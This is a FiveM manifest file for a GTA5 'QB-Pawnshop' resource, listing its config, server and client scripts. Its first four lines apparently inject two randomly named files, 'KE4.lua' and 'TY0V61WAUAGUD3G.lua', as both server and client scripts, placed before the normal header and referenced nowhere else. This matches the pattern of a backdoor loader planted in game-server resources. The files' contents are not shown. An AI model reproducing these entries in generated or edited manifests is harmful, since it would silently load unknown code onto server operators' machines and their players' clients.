server_script "KE4.lua"
client_script "KE4.lua"
server_script "TY0V61WAUAGUD3G.lua"
client_script "TY0V61WAUAGUD3G.lua"
fx_version 'cerulean'
game 'gta5'

description 'QB-Pawnshop'
version '1.0.0'

server_scripts {
	'config.lua',
	'server/main.lua',
}

client_scripts {
	'config.lua',
	'client/main.lua',
	'client/melt.lua',
}